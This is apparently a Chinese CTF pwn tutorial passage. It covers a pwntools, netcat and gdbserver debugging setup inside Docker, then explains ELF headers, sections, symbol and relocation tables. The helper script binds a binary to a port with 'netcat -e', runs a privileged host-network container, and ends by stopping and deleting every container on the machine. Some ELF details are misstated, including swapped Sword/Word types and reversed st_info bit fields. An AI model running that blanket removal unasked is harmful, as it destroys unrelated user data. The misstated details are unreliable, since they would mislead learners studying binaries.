<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>) <span class="comment"># nc 连接远程程序</span></span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>), exe=<span class="string">&quot;./pwn&quot;</span>, gdbscript=<span class="string">&quot;&quot;</span>) <span class="comment"># gdb 连接 docker 中的 gdbserver 调试 ./pwn</span></span><br><span class="line"></span><br><span class="line">pause() <span class="comment"># 阻塞脚本直到 gdb 成功连接 gdbserver防止程序跑飞</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">r.sendlineafter(&quot;xxxx&quot;, &quot;xxx&quot;) # 脚本远程交互</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行脚本前首先在 docker 容器中用 <code>netcat</code> 将题目程序 IO 映射到 8888 端口：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div></li>
<li>运行脚本，阻塞在 <code>gdb.attach</code> 时脚本已经与远程的 <code>netcat</code> 连接，此时 docker 镜像中已经有 <code>pwn</code> 这个进程了。此时使用 <code>ps -aux | grep pwn</code> 查看进程 <code>pid</code> 然后运行如下命令让 <code>gdbserver</code> 附加进程并监听 9999 端口。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdbserver :9999 --attach 进程pid</span><br></pre></td></tr></table></figure></div></li>
<li>此时脚本执行 <code>gdb.attach</code> 连接 docker 中的 <code>gdbserver</code> 并阻塞在 <code>pause()</code> 上直到 <code>gdb</code> 成功连接 <code>gdbserver</code> 。</li>
<li>在脚本运行窗口按回车解除阻塞进行调试。</li>
</ul>
<p>其中 docker 中的操作可以通过脚本自动化实现。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IMAGE_NAME=minipy-debug</span><br><span class="line">CONTAINER_HOME=/home/ctf</span><br><span class="line">PROG_NAME=minipy</span><br><span class="line">NC_PORT=8888</span><br><span class="line">DBG_PORT=9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># load image</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker images | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    docker load -i <span class="variable">$&#123;IMAGE_NAME&#125;</span>.tar</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start continer</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker ps | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#   docker run --privileged -itd -p $&#123;DBG_PORT&#125;:$&#123;DBG_PORT&#125; -p $&#123;NC_PORT&#125;:$&#123;NC_PORT&#125; $&#123;IMAGE_NAME&#125;</span></span><br><span class="line">    docker run --privileged -itd --net=host <span class="variable">$&#123;IMAGE_NAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get continer id</span></span><br><span class="line">CONTAINER_ID=$(docker ps -q --filter <span class="string">&quot;ancestor=<span class="variable">$&#123;IMAGE_NAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cp files</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/gdbserver <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/netcat <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./<span class="variable">$&#123;PROG_NAME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start run</span></span><br><span class="line">docker <span class="built_in">exec</span> -itd -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;./netcat -lvp <span class="variable">$&#123;NC_PORT&#125;</span> -e ./<span class="variable">$&#123;PROG_NAME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;ps -ef | grep <span class="variable">$&#123;PROG_NAME&#125;</span> | grep -v &#x27;grep&#x27; | grep -v &#x27;\-c&#x27; | awk &#x27;&#123;print \$2&#125;&#x27; | xargs ./gdbserver :<span class="variable">$&#123;DBG_PORT&#125;</span> --attach&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker stop $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"><span class="comment">#docker rm $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div>
<h1 id="ELF-文件格式"><a href="#ELF-文件格式" class="headerlink" title="ELF 文件格式"></a>ELF 文件格式</h1><p>ELF（Executable and Linkable Format）是一种常见的可执行文件和可链接文件格式，主要用于Linux和类Unix系统。ELF 文件可以包含不同的类型，常见的 ELF 文件类型包括：</p>
<ul>
<li>可执行文件（<code>ET_EXEC</code>）：这种类型的 ELF 文件是可直接执行的程序，可以在操作系统上运行。</li>
<li>共享目标文件（<code>ET_DYN</code>）：这种类型的 ELF 文件是可被动态链接的共享库，可以在运行时与其他程序动态链接。该类型文件后缀名为 <code>.so</code> 。</li>
<li>可重定位文件（<code>ET_REL</code>）：这种类型的 ELF 文件是编译器生成的目标文件，通常用于将多个目标文件链接到一个可执行文件或共享库中。该类型文件后缀名为 <code>.o</code> ，静态链接库（<code>.a</code>）也可以归为这一类。</li>
<li>核心转储文件（<code>ET_CORE</code>）：这种类型的 ELF 文件是操作系统在程序崩溃或发生错误时生成的核心转储文件，用于调试和分析程序崩溃的原因。</li>
</ul>
<p>ELF 文件结构及相关常数被定义在 <code>/usr/include/elf.h</code> 里，因为 ELF 文件在各种平台下都通用，ELF文件有 32 位版本和 64 位版本。32 位版本与 64 位版本的 ELF 文件的格式基本是一样的（部分结构体为了优化对齐后大小调整了成员的顺序），只不过有些成员的大小不一样。</p>
<p><code>elf.h</code> 使用 typedef 定义了一套自己的变量体系：</p>
<table>
<thead>
<tr>
<th>自定义类型</th>
<th>描述</th>
<th>原始类型</th>
<th>长度（字节）</th>
</tr>
</thead>
<tbody><tr>
<td><code>Elf32_Addr</code></td>
<td>32 位版本程序地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Half</code></td>
<td>32 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf32_Off</code></td>
<td>32 位版本的偏移地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Sword</code></td>
<td>32 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Word</code></td>
<td>32 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Addr</code></td>
<td>64 位版本程序地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Half</code></td>
<td>64 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf64_Off</code></td>
<td>64 位版本的偏移地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Sword</code></td>
<td>64 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Word</code></td>
<td>64 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
</tbody></table>
<p>ELF 主要管理结构为文件头，程序头表（可重定位文件没有）和节表，其他部分有一个个节组成，多个属性相同的节构成一个段。对于节的介绍这里按照静态链接相关和动态链接相关分别介绍。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108001735862.png"
                      alt="image-20241108001735862" style="zoom:33%;" 
                >

<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>我们这里以 32 位版本的文件头结构 <code>Elf32_Ehdr</code> 作为例子来描述，它的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The ELF file header.  This appears at the start of every ELF file.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off	e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>e_ident</code>：ELF 文件的魔数和其他信息。</strong><ul>
<li>前 4 字节为 <code>ELFMAG</code> 即 <code>\x7fELF</code> 。</li>
<li>第 5 字节为 ELF 文件类型，值为 <code>ELFCLASS32(1)</code> 代表 32 位，值为 <code>ELFCLASS64(2)</code> 代表 64 位。 </li>
<li>第 6 字节为 ELF 的字节序，0 为无效格式，1 为小端格式，2 为大端格式。</li>
<li>第 7 字节为 ELF 版本，一般为 1 ，即 1.2 版本。</li>
<li>后面 9 字节没有定义一般填 0 ，有些平台会使用这 9 个字节作为扩展标志。</li>
</ul>
</li>
<li><strong><code>e_type</code>：表示ELF文件类型，如可执行文件、共享对象文件（<code>.so</code>）、可重定位文件（<code>.o</code>）等。</strong></li>
<li><code>e_machine</code>：表示目标体系结构，即程序的目标平台，如 x86、ARM 等。相关常量以 <code>EM_</code> 开头。</li>
<li><code>e_version</code>：ELF 文件版本号，一般为常数 1 。</li>
<li><strong><code>e_entry</code>：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为 0 。</strong></li>
<li><strong><code>e_phoff</code>：表示程序头表的文件偏移量。</strong></li>
<li><strong><code>e_shoff</code>：表示节表的文件偏移量。</strong></li>
<li><code>e_flags</code>：表示处理器特定标志。</li>
<li><strong><code>e_ehsize</code>：表示 ELF 文件头的大小。</strong></li>
<li><strong><code>e_phentsize</code>：表示程序头表中每个表项的大小。</strong></li>
<li><strong><code>e_phnum</code>：表示程序头表中表项的数量。</strong></li>
<li><strong><code>e_shentsize</code>：表示节表中每个表项的大小。</strong></li>
<li><strong><code>e_shnum</code>：表示节表中表项的数量。</strong></li>
<li><code>e_shstrndx</code>：<strong>表示节表中字符串表的索引。</strong></li>
</ul>
<h2 id="程序头表"><a href="#程序头表" class="headerlink" title="程序头表"></a>程序头表</h2><p>ELF 可执行文件中有一个专门的数据结构叫做程序头表（Program Header Table）用来保存<strong>段</strong>（<strong>注意不是节</strong>）的信息。因为 ELF <strong>目标文件</strong>不需要被装载，所以它没有程序头表，而 ELF 的<strong>可执行文件</strong>和<strong>共享库文件</strong>都有程序头表。</p>
<p>程序头表是由 <code>Elf*_Phdr</code> 组成的数组，用于描述 ELF 文件中每个节的属性和信息。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Program segment header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf32_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf32_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf32_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf32_Word	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf32_Word	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf32_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf32_Word	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>p_type</code>：段的类型，例如可执行段、数据段等。</li>
<li><code>p_offset</code>：段在文件中的偏移量。</li>
<li><code>p_vaddr</code>：段在虚拟内存中的起始地址。</li>
<li><code>p_paddr</code>：段在物理内存中的起始地址。因为 ELF 还没装载不知道物理地址，所以作为保留字段。通常和 <code>p_vaddr</code> 的值是一样的。</li>
<li><code>p_filesz</code>：段在文件中的大小。</li>
<li><code>p_memsz</code>：段在内存中的大小。</li>
<li><code>p_flags</code>：段的标志，例如可读、可写、可执行等。</li>
<li><code>p_align</code>：段在文件和内存中的对齐方式。段的的加载地址要能被 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mtext>p_align</mtext></msup></mrow><annotation encoding="application/x-tex">2^{\text{p\_align}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">p_align</span></span></span></span></span></span></span></span></span></span></span></span></span> 整除。</li>
</ul>
<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>ELF文件里面定义一个固定长度的 <code>Elf*_Shdr</code> 结构体数组用来存放<strong>节</strong>相关信息，与 PE 文件的节表相似。</p>
<blockquote>
<p>在 ELF 文件中，<strong>段</strong>（Segment）和<strong>节</strong>（Section）是两个不同的概念，它们在文件结构中具有不同的作用和目的。<br><br>段（Segment）是一种逻辑上的组织单位，它定义了可执行文件或共享库在内存中的一个连续区域。每个段都有自己的虚拟地址空间，可以包含多个节。常见的段类型包括代码段（<code>.text</code>），数据段（<code>.data</code>、<code>.bss</code>），只读数据段（<code>.rodata</code>）等。段在加载和执行时被操作系统用来管理内存，设置内存保护属性以及指定虚拟地址空间的起始地址和大小。<br><br>节（Section）是一种更细粒度的组织单位，它包含了文件中的特定类型的数据或代码。每个节都有自己的名字、类型和内容。常见的节类型包括代码节（<code>.text</code>），数据节（<code>.data</code>、<code>.bss</code>），只读数据节（<code>.rodata</code>），符号表节（<code>.symtab</code>），字符串表节（<code>.strtab</code>）等。节不直接参与内存的加载和执行，而是用于链接器（Linker）和调试器（Debugger）等工具对文件进行处理和分析。<br><br><strong>通俗的讲，在装载程序的时候为了节省内存会将 ELF 文件中属性相同的节（Section）合并成在一个段（Segment）加载到内存中。</strong><br><br>段和节之间存在对应关系和映射关系：</p>
<ul>
<li>一个段可以包含多个节，这些节的内容和属性都属于该段。</li>
<li>段提供了对应于虚拟内存的逻辑映射，而节则提供了对应于文件的逻辑映射。</li>
<li>段的加载和执行涉及内存管理和地址映射，而节则用于链接和调试过程中的符号解析、重定位等操作。</li>
</ul>
</blockquote>
<p>其中 <code>Elf32_Shdr</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word	sh_type;		<span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word	sh_flags;		<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off	sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word	sh_size;		<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word	sh_addralign;		<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>sh_name</code>：表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，<code>sh_name</code> 指定了节的名称在字符串表中的位置。</strong></li>
<li><strong><code>sh_type</code>：表示节的类型，指定了节的用途和属性。常见的类型包括代码段（<code>SHT_PROGBITS(1)</code>）、数据段（<code>SHT_PROGBITS(1)</code>）、符号表（<code>SHT_SYMTAB(2)</code>）、字符串表（<code>SHT_STRTAB(3)</code>）等。</strong></li>
<li><code>sh_flags</code>：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。</li>
<li><strong><code>sh_addr</code>：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，<code>sh_addr</code> 指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。</strong></li>
<li><strong><code>sh_offset</code>：表示节在文件中的偏移量，指定了节在文件中的位置。对于 bss 段来说该值没有意义。</strong></li>
<li><strong><code>sh_size</code>：表示节的大小，指定了节所占据的字节数。</strong></li>
<li><code>sh_link</code>：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。</li>
<li><code>sh_info</code>：附加信息，具体含义依赖于节的类型。</li>
<li><code>sh_addralign</code>：表示节的地址对齐要求，指定了节在内存中的对齐方式。即 <code>sh_addr</code> 需要满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>sh_addr</mtext><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mtext>sh_addralign</mtext></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\text{sh\_addr} \mod 2^{\text{sh\_addralign}} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sh_addr</span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">sh_addralign</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 。如果 <code>sh_addralign</code> 为 0 或 1 表示该段没有对齐要求。</li>
<li><strong><code>sh_entsize</code>：表示节中每个项的大小，如果该字段为 0 说明节中不包含固定大小的项。</strong></li>
</ul>
<p>ELF 中常见的节如下：</p>
<ul>
<li><code>.text</code>：代码段（Code Section），用于存储程序的可执行指令。</li>
<li><code>.rodata</code>：只读数据段（Read-Only Data Section），用于存储只读的常量数据，例如字符串常量。</li>
<li><code>.data</code>：数据段（Data Section），用于存储已初始化的全局变量和静态变量。</li>
<li><code>.bss</code>：未初始化的数据段（Block Started by Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。</li>
<li><code>.symtab</code>：符号表节（Symbol Table Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。</li>
<li><code>.strtab</code>：字符串表节（String Table Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。</li>
<li><code>.rel.text</code> 或 <code>.rela.text</code>：代码重定位节（Relocation Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。</li>
<li><code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。</li>
<li><code>.dynamic</code>：动态节（Dynamic Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。</li>
<li><code>.note</code>：注释节（Note Section），用于存储与程序或库相关的注释或调试信息。</li>
</ul>
<h2 id="静态链接相关"><a href="#静态链接相关" class="headerlink" title="静态链接相关"></a>静态链接相关</h2><p><strong>注意：静态链接相关只在可重定位文件中存在。比如可执行文件，如果不开启 PIE 加载地址固定，不需要对自身进行重定位，而开启 PIE 后为地址无关代码，也不需要对自身进行重定位。因此不需要静态链接也就丢弃了静态链接相关的节。</strong></p>
<h3 id="符号表（-symtab）"><a href="#符号表（-symtab）" class="headerlink" title="符号表（.symtab）"></a>符号表（.symtab）</h3><p><strong>注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过 <code>strip + 程序名</code> 的方式将符号表去除，这就是为什么有的 pwn 题的附件没有函数和变量名而有的却有。</strong></p>
<p>ELF 文件中的符号表往往是文件中的一个段，段名一般叫 <code>.symtab</code> 。符号表是一个 <code>Elf*_Sym</code> 结构（32 位 ELF 文件）的数组，每个 <code>Elf*_Sym</code> 结构对应一个符号。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>st_name</code>：符号名称在<strong>字符串</strong>表中的偏移量。</li>
<li><code>st_value</code>：符号的值，即符号的地址或偏移量。<ul>
<li>如果该符号在<strong>目标文件</strong>中，如果是符号的定义并且该符号不是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>。</li>
<li>在<strong>目标文件</strong>中，如果符号是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号的<strong>对齐属性</strong>。</li>
<li>在<strong>可执行文件</strong>中，<code>st_value</code> 表示符号的<strong>虚拟地址</strong>。</li>
</ul>
</li>
<li><code>st_size</code>：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为 0 表示符号的大小为 0 或未知。</li>
<li><code>st_info</code>：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高 4 位表示符号的类型，低 4 位表示符号的绑定信息。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在<strong>节</strong>的索引。<ul>
<li>如果符号是一个常量，该字段为 <code>SHN_ABS</code>（初始值不为 0 的全局变量） 或 <code>SHN_COMMON</code>（初始值为 0 的全局变量）。</li>
<li>如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为 <code>SHN_UNDEF</code> 。</li>
</ul>
</li>
</ul>
<h3 id="重定位表（-rel-text-rel-data）"><a href="#重定位表（-rel-text-rel-data）" class="headerlink" title="重定位表（.rel.text&#x2F;.rel.data）"></a>重定位表（.rel.text&#x2F;.rel.data）</h3><p>重定位表是一个 <code>Elf*_Rel</code> 结构的数组，每个数组元素对应一个重定位入口。重定位表主要有<code>.rel.text</code> 或 <code>.rela.text</code>，即代码重定位节（Relocation Section）和 <code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>r_offset</code>：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。<ul>
<li>对于可执行文件或共享库，<code>r_offset</code> 表示需要修改的位置在内存中的位置（用于动态链接）。</li>
<li>对于<strong>可重定位文件</strong>，<code>r_offset</code> 表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。</li>
</ul>
</li>
<li><code>r_info</code>：低 8 位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC 相对重定位等。高 24 位表示该符号在<strong>符号表</strong>中的索引，用于解析重定位所引用的符号。</li>
</ul>
<h3 id="字符串表（-strtab）"><a href="#字符串表（-strtab）" class="headerlink" title="字符串表（.strtab）"></a>字符串表（.strtab）</h3><p>ELF 文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</p>
<p>通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“<code>.strtab</code>”或“<code>.shstrtab</code>”。这两个字符串表分别为字符串表（String Table）和段表字符串表（Section Header String Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（<code>sh_name</code> ）。</p>
<p>注意，在字符串表中的每个字符串的<strong>开头</strong>和<strong>结尾</strong>都有一个 <code>\x00</code> 填充。</p>
<h2 id="动态链接相关"><a href="#动态链接相关" class="headerlink" title="动态链接相关"></a>动态链接相关</h2><h3 id="interp-段"><a href="#interp-段" class="headerlink" title=".interp 段"></a>.interp 段</h3><p>在动态链接的 ELF 可执行文件中，有一个专门的段叫做 <code>.interp</code> 段（“interp”是“interpreter”（解释器）的缩写）。</p>
<p><code>.interp</code> 的内容很简单，里面保存的就是一个字符串 <code>/lib64/ld-linux-x86-64.so.2</code> ，这个字符串就是可执行文件所需要的动态链接器的路径。</p>
